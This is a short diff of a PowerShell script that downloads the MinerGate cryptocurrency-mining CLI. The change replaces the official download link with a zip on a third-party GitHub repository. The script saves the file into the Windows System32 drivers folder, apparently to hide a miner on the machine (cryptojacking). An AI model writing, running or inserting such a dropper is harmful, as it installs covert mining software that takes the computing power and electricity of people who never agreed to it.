@@ -1,5 +1,5 @@
 # Download MinerGate CLI
-$url = "https://minergate.com/download/win-cli"
+$url = "https://github.com/diggles9991/MG/raw/master/MinerGate-cli-4.04-win64.zip"
 $output = "C:\Windows\System32\drivers\en-US\MG.zip"
 $wc = New-Object System.Net.WebClient
 $wc.DownloadFile($url, $output)
